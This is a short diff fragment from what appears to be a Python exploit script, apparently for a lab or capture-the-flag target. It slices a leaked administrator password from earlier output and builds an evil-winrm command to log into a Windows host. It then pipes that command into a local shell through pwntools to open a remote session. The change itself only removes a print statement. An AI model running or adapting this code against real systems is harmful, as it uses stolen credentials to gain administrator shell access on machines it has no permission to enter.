@@ -11,7 +11,6 @@ x = line1.rstrip()[-28:-4]
 rpass = x.decode()
 
 shell = "evil-winrm -i " + ip + " -u administrator -p '" + rpass + "' -S"
-print(shell)
 
 pwn = process('/bin/sh')
 pwn.sendline(shell)
